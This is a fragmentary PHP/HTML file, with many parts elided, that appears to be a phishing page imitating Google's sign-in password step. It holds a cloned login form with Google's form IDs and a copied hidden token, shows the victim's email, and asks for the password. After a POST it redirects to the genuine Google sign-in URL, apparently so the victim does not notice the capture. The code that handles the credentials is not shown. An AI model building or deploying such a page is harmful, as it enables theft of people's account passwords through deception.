...
if($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    header("location: https://accounts.google.com/signin/challenge/sl/password#password");
}
?>
...
">
   ...
   no-name">
      ...
      ">
                ...
                <form novalidate method="post" action="" id="gaia_loginform">
                    ...
                    <input type="hidden" name="gxf" value="AFoagUUXA7zdawjHCzXoETVSIgPK20kmzw:1480805166264">
                        ...
                        <div class="slide-out ">
                            <div class="input-wrapper focused">
                                <div id="identifier-shown">
                                    <div>
                                        <div>
                                            <span id="email-display"><?php echo $email ?></span>
                                        </div>
                                        <label class="hidden-label" for="Email">
                                            Enter your password</label>
                                        <input id="Email" type="password" value="" spellcheck="false"
                                               name="Email"
  ...
  Letters are not case-sensitive
                            ...
                            <input id="next" name="signIn" class="rc-button rc-button-submit" type="submit" value="Sign in">
                            <a class="need-help"
